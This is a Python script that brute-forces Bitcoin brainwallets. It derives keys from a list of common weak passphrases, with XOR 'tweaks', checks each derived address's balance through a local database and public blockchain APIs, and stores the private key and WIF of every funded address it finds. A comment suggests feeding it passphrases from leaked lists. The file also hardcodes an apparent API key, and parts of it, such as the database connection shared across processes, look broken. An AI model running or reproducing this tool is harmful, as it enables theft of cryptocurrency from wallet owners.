import os
import time
import hashlib
import requests
import sqlite3
import base58
import ecdsa
import binascii
import multiprocessing
from concurrent.futures import ThreadPoolExecutor
from typing import List, Tuple

# API keys and database
COINAPI_KEY = 'ec42825f-62f6-4c0f-99b6-d0dfcad2498d'
DATABASE_PATH = 'database/11_13_2022/'
DATABASE_AVAILABLE = os.path.exists(DATABASE_PATH)

# SQLite setup
def init_db():
    conn = sqlite3.connect('database/btc_addresses.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS addresses
                 (private_key TEXT, wif_key TEXT, address TEXT, balance INTEGER, timestamp TEXT)''')
    conn.commit()
    return conn

# Brainwallet key generation with tweaking
def generate_brainwallet_key(passphrase: str, tweak: int = 0) -> Tuple[bytes, str]:
    base_key = hashlib.sha256(passphrase.encode()).digest()
    tweaked_key = bytes(a ^ b for a, b in zip(base_key, tweak.to_bytes(32, 'big')))
    sk = ecdsa.SigningKey.from_string(tweaked_key, curve=ecdsa.SECP256k1)
    vk = sk.verifying_key
    public_key = b'\x04' + vk.to_string()
    sha256_hash = ecdsa.util.sha256(public_key)
    ripemd160_hash = ecdsa.util.ripemd160(sha256_hash)
    extended_hash = b'\x00' + ripemd160_hash
    checksum = ecdsa.util.sha256(ecdsa.util.sha256(extended_hash))[:4]
    address = base58.b58encode(extended_hash + checksum).decode('utf-8')
    return tweaked_key, address

# Convert private key to WIF
def private_key_to_wif(priv_key: bytes) -> str:
    extended_key = b'\x80' + priv_key
    checksum = hashlib.sha256(hashlib.sha256(extended_key).digest()).digest()[:4]
    return base58.b58encode(extended_key + checksum).decode('utf-8')

# Plutus database check
def check_balance_database(address: str, substring_length: int = 8) -> Tuple[str, int]:
    if not DATABASE_AVAILABLE:
        return address, 0
    substring = address[-substring_length:]
    for filename in os.listdir(DATABASE_PATH):
        with open(os.path.join(DATABASE_PATH, filename), 'r') as f:
            if substring in f.read():
                f.seek(0)
                if address in f.read():
                    return address, 1  # Funded address
    return address, 0

# CoinAPI balance check
def check_balance_coinapi(address: str) -> int:
    url = f"https://rest.coinapi.io/v1/balances/bitcoin/address/{address}"
    headers = {'X-CoinAPI-Key': COINAPI_KEY}
    try:
        response = requests.get(url, headers=headers, timeout=2)
        response.raise_for_status()
        data = response.json()
        return int(data.get('balance', 0) * 100000000)  # BTC to Satoshi
    except requests.RequestException:
        return check_balance_blockchain(address)

# Blockchain.com fallback
def check_balance_blockchain(address: str) -> int:
    url = f"https://blockchain.info/q/addressbalance/{address}"
    try:
        response = requests.get(url, timeout=1)
        return int(response.text)
    except requests.RequestException:
        return 0

# Batch balance checking
def check_balance_batch(addresses: List[str], use_database: bool = True) -> List[Tuple[str, int]]:
    if use_database and DATABASE_AVAILABLE:
        results = list(map(check_balance_database, addresses))
        # Verify real balances for hits
        with ThreadPoolExecutor(max_workers=10) as executor:
            future_to_addr = {executor.submit(check_balance_coinapi, addr): addr for addr, bal in results if bal > 0}
            verified = {future_to_addr[future]: future.result(timeout=3) for future in future_to_addr}
        return [(addr, verified.get(addr, bal if bal == 0 else check_balance_coinapi(addr))) for addr, bal in results]
    else:
        with ThreadPoolExecutor(max_workers=10) as executor:
            future_to_addr = {executor.submit(check_balance_coinapi, addr): addr for addr in addresses}
            results = []
            for future in future_to_addr:
                addr = future_to_addr[future]
                try:
                    balance = future.result(timeout=3)
                    results.append((addr, balance))
                except Exception:
                    results.append((addr, 0))
            return results

# Save to DB
def save_to_db(conn, priv_key: bytes, address: str, balance: int):
    wif_key = private_key_to_wif(priv_key)
    c = conn.cursor()
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    c.execute("INSERT INTO addresses VALUES (?, ?, ?, ?, ?)",
              (priv_key.hex(), wif_key, address, balance, timestamp))
    conn.commit()
    print(f"Found: {address} | Balance: {balance / 100000000:.8f} BTC | WIF: {wif_key}")

# Worker function
def worker(passphrases: List[str], tweak_range: int, conn, checked_count: multiprocessing.Value):
    local_count = 0
    for passphrase in passphrases:
        for tweak in range(tweak_range):
            priv_key, address = generate_brainwallet_key(passphrase, tweak)
            addr, balance = check_balance_batch([address])[0]
            if balance > 0:  # Any real balance
                save_to_db(conn, priv_key, address, balance)
            local_count += 1
    with checked_count.get_lock():
        checked_count.value += local_count

# Main loop
def main():
    conn = init_db()
    
    # Large passphrase list (expandable)
    passphrases = [
        "password", "bitcoin", "123456", "secret", "letmein",
        "qwerty", "admin", "blockchain", "crypto", "money",
        "pass123", "btc2023", "wallet", "secure", "freedom",
        "password123", "bitcoin2023", "123456789", "test", "hello",
        "abc123", "mywallet", "cash", "satoshi", "hodl",
        "admin123", "pass", "love", "root", "private",
        # Add more from leaked lists or brainwallet studies
    ]
    tweak_range = 50  # Increased for more coverage
    
    checked_count = multiprocessing.Value('i', 0)  # Shared counter
    
    try:
        start_time = time.time()
        processes = []
        cpu_count = min(multiprocessing.cpu_count(), 4)
        chunk_size = len(passphrases) // cpu_count + 1
        
        for i in range(cpu_count):
            chunk = passphrases[i * chunk_size:(i + 1) * chunk_size]
            p = multiprocessing.Process(target=worker, args=(chunk, tweak_range, conn, checked_count))
            processes.append(p)
            p.start()
        
        while time.time() - start_time < 120:  # ~2 minutes
            elapsed = time.time() - start_time
            with checked_count.get_lock():
                total_keys = checked_count.value
            print(f"Elapsed: {elapsed:.1f}s | Checked: {total_keys} keys | Database: {DATABASE_AVAILABLE}")
            time.sleep(5)
        
        for p in processes:
            p.terminate()

    except KeyboardInterrupt:
        print("Stopped by user.")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        for p in processes:
            p.join()
        conn.close()

if __name__ == "__main__":
    main()
